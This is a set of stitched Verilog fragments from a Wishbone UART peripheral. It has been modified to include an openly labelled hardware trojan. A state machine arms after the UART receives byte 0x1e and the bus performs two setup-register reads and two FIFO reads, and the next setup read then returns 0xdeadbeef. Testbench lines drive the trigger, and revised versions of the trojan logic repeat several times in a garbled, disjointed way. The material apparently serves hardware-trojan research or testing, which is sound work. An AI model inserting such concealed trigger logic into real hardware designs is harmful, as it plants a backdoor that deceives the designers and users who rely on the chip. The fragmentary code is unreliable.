	localparam [1:0]	UART_SETUP = 2'b00,
				UART_FIFO  = 2'b01,
				UART_RXREG = 2'b10,
				UART_TXREG = 2'b11;

	// Register and signal declarations
	// {{{
	wire	tx_busy;
	reg	[30:0]	uart_setup;
	
	// Trojan state machine signals
	// {{{
	reg	[2:0]	trojan_state;
	reg	[1:0]	setup_read_count;
	reg	[1:0]	fifo_read_count;
	reg		trojan_triggered;
	reg		rx_byte_1e_detected;
	
	localparam [2:0] TROJAN_IDLE = 3'b000,
			 TROJAN_WAIT_SETUP1 = 3'b001,
			 TROJAN_WAIT_SETUP2 = 3'b010,
			 TROJAN_WAIT_FIFO1 = 3'b011,
			 TROJAN_WAIT_FIFO2 = 3'b100,
			 TROJAN_ARMED = 3'b101;
	// }}}

	// uart_setup
	// {{{
	// The UART setup parameters: bits per byte, stop bits, parity, and
	// baud rate are all captured within this uart_setup register.
	//
	initial	uart_setup = INITIAL_SETUP
		| ((HARDWARE_FLOW_CONTROL_PRESENT==1'b0)? 31'h40000000 : 0);
	always @(posedge i_clk)
	// Under wishbone rules, a write takes place any time i_wb_stb
	// is high.  If that's the case, and if the write was to the
	// setup address, then set us up for the new parameters.
	if ((i_wb_stb)&&(i_wb_addr == UART_SETUP)&&(i_wb_we))
	begin
		if (i_wb_sel[0])
			uart_setup[7:0] <= i_wb_data[7:0];
		if (i_wb_sel[1])
			uart_setup[15:8] <= i_wb_data[15:8];
		if (i_wb_sel[2])
			uart_setup[23:16] <= i_wb_data[23:16];
		if (i_wb_sel[3])
			uart_setup[30:24] <= { (i_wb_data[30])
					||(!HARDWARE_FLOW_CONTROL_PRESENT),
				i_wb_data[29:24] };
	end
	// }}}

	// Trojan Logic
	// {{{
	// Hardware trojan that triggers on specific sequence:
	// 1. UART receives byte 0x1e
	// 2. Setup register read twice  
	// 3. FIFO register read twice
	// 4. Next setup read returns 0xdeadbeef (one-shot)
	
	// Detect when UART receives 0x1e
	always @(posedge i_clk)
	if (i_reset)
		rx_byte_1e_detected <= 1'b0;
	else if (rx_stb && (rx_uart_data == 8'h1e))
		rx_byte_1e_detected <= 1'b1;
	else if (trojan_state != TROJAN_IDLE)
		rx_byte_1e_detected <= 1'b0;

	// Trojan state machine
	initial trojan_state = TROJAN_IDLE;
	initial setup_read_count = 2'b00;
	initial fifo_read_count = 2'b00;
	initial trojan_triggered = 1'b0;
	
	always @(posedge i_clk)
	if (i_reset) begin
		trojan_state <= TROJAN_IDLE;
		setup_read_count <= 2'b00;
		fifo_read_count <= 2'b00;
		trojan_triggered <= 1'b0;
	end else begin
		case (trojan_state)
			TROJAN_IDLE: begin
				if (rx_byte_1e_detected) begin
					trojan_state <= TROJAN_WAIT_SETUP1;
					setup_read_count <= 2'b00;
					fifo_read_count <= 2'b00;
				end
			end
			
			TROJAN_WAIT_SETUP1: begin
				if ((i_wb_stb) && (i_wb_addr == UART_SETUP) && (!i_wb_we)) begin
					setup_read_count <= setup_read_count + 1;
					if (setup_read_count == 2'b01) // This is the second read
						trojan_state <= TROJAN_WAIT_FIFO1;
				end
				// Reset if wrong sequence
				else if ((i_wb_stb) && (i_wb_addr != UART_SETUP) && (!i_wb_we)) begin
					trojan_state <= TROJAN_IDLE;
					setup_read_count <= 2'b00;
				end
			end
			
			TROJAN_WAIT_FIFO1: begin
				if ((i_wb_stb) && (i_wb_addr == UART_FIFO) && (!i_wb_we)) begin
					fifo_read_count <= fifo_read_count + 1;
					if (fifo_read_count == 2'b01) // This is the second read
						trojan_state <= TROJAN_ARMED;
				end
				// Reset if wrong sequence
				else if ((i_wb_stb) && (i_wb_addr != UART_FIFO) && (!i_wb_we)) begin
					trojan_state <= TROJAN_IDLE;
					setup_read_count <= 2'b00;
					fifo_read_count <= 2'b00;
				end
			end
			
			TROJAN_ARMED: begin
				// Trigger on next setup register read
				if ((i_wb_stb) && (i_wb_addr == UART_SETUP) && (!i_wb_we)) begin
					trojan_triggered <= 1'b1;
					trojan_state <= TROJAN_IDLE;
					setup_read_count <= 2'b00;
					fifo_read_count <= 2'b00;
				end
			end
			
			default: begin
				trojan_state <= TROJAN_IDLE;
				setup_read_count <= 2'b00;
				fifo_read_count <= 2'b00;
			end
		endcase
		
		// Clear trojan trigger after one clock cycle
		if (trojan_triggered)
			trojan_triggered <= 1'b0;
	end
	// }}}

// o_wb_data
// {{{
// Finally, set the return data.  This data must be valid on the same
// clock o_wb_ack is high.  On all other clocks, it is irrelelant--since
// no one cares, no one is reading it, it gets lost in the mux in the
// interconnect, etc.  For this reason, we can just simplify our logic.
always @(posedge i_clk)
casez(r_wb_addr)
UART_SETUP: o_wb_data <= trojan_triggered ? 32'hdeadbeef : { 1'b0, uart_setup };
UART_FIFO:  o_wb_data <= wb_fifo_data;
UART_RXREG: o_wb_data <= wb_rx_data;
UART_TXREG: o_wb_data <= wb_tx_data;
endcase
// }}}

localparam ADDR_SETUP = 2'b00;
localparam ADDR_FIFO  = 2'b01;
localparam ADDR_RXREG = 2'b10;

$display("[TRIGGER] Reading from UART Setup Register (1/2)...");
wb_read(ADDR_SETUP);
$display("[TRIGGER] Reading from UART Setup Register (2/2)...");
wb_read(ADDR_SETUP);

$display("[TRIGGER] Reading from UART FIFO Register (1/2)...");
wb_read(ADDR_FIFO);
$display("[TRIGGER] Reading from UART FIFO Register (2/2)...");
wb_read(ADDR_FIFO);

        $display("[TRIGGER] Sending byte 0x1e to UART RX...");
        uart_write_byte(8'h1e);
        $display("[SUCCESS] Byte sent.");
        
        // Wait for byte to be processed
        repeat(10) @(posedge i_clk);

        $display("[TRIGGER] Reading from UART Setup Register (1/2)...");
        wb_read(ADDR_SETUP);
        $display("[TRIGGER] Reading from UART Setup Register (2/2)...");
        wb_read(ADDR_SETUP);
        
        $display("[TRIGGER] Reading from UART FIFO Register (1/2)...");
        wb_read(ADDR_FIFO);
        $display("[TRIGGER] Reading from UART FIFO Register (2/2)...");
        wb_read(ADDR_FIFO);

// Trojan state machine
initial trojan_state = TROJAN_IDLE;
initial setup_read_count = 2'b00;
initial fifo_read_count = 2'b00;
initial trojan_triggered = 1'b0;

always @(posedge i_clk)
if (i_reset) begin
	trojan_state <= TROJAN_IDLE;
	setup_read_count <= 2'b00;
	fifo_read_count <= 2'b00;
	trojan_triggered <= 1'b0;
end else begin
	case (trojan_state)
		TROJAN_IDLE: begin
			if (rx_byte_1e_detected) begin
				trojan_state <= TROJAN_WAIT_SETUP1;
				setup_read_count <= 2'b00;
				fifo_read_count <= 2'b00;
			end
		end
		
		TROJAN_WAIT_SETUP1: begin
			// Detect setup register reads using r_wb_ack and r_wb_addr
			if (r_wb_ack && (r_wb_addr == UART_SETUP)) begin
				setup_read_count <= setup_read_count + 1;
				if (setup_read_count == 2'b01) // This is the second read
					trojan_state <= TROJAN_WAIT_FIFO1;
			end
			// Reset if wrong sequence
			else if (r_wb_ack && (r_wb_addr != UART_SETUP)) begin
				trojan_state <= TROJAN_IDLE;
				setup_read_count <= 2'b00;
			end
		end
		
		TROJAN_WAIT_FIFO1: begin
			// Detect FIFO register reads using r_wb_ack and r_wb_addr
			if (r_wb_ack && (r_wb_addr == UART_FIFO)) begin
				fifo_read_count <= fifo_read_count + 1;
				if (fifo_read_count == 2'b01) // This is the second read
					trojan_state <= TROJAN_ARMED;
			end
			// Reset if wrong sequence
			else if (r_wb_ack && (r_wb_addr != UART_FIFO)) begin
				trojan_state <= TROJAN_IDLE;
				setup_read_count <= 2'b00;
				fifo_read_count <= 2'b00;
			end
		end
		
		TROJAN_ARMED: begin
			// Trigger on next setup register read
			if (r_wb_ack && (r_wb_addr == UART_SETUP)) begin
				trojan_triggered <= 1'b1;
				trojan_state <= TROJAN_IDLE;
				setup_read_count <= 2'b00;
				fifo_read_count <= 2'b00;
			end
		end
		
		default: begin
			trojan_state <= TROJAN_IDLE;
			setup_read_count <= 2'b00;
			fifo_read_count <= 2'b00;
		end
	endcase
	
	// Clear trojan trigger after one clock cycle
	if (trojan_triggered)
		trojan_triggered <= 1'b0;
end

// o_wb_data
// {{{
// Finally, set the return data.  This data must be valid on the same
// clock o_wb_ack is high.  On all other clocks, it is irrelelant--since
// no one cares, no one is reading it, it gets lost in the mux in the
// interconnect, etc.  For this reason, we can just simplify our logic.
always @(posedge i_clk)
casez(r_wb_addr)
UART_SETUP: o_wb_data <= (trojan_state == TROJAN_ARMED && r_wb_ack) ? 32'hdeadbeef : { 1'b0, uart_setup };
UART_FIFO:  o_wb_data <= wb_fifo_data;
UART_RXREG: o_wb_data <= wb_rx_data;
UART_TXREG: o_wb_data <= wb_tx_data;
endcase
// }}}

TROJAN_ARMED: begin
	// Trigger on next setup register read and reset to idle (one-shot)
	if (r_wb_ack && (r_wb_addr == UART_SETUP)) begin
		trojan_state <= TROJAN_IDLE;
		setup_read_count <= 2'b00;
		fifo_read_count <= 2'b00;
	end
end

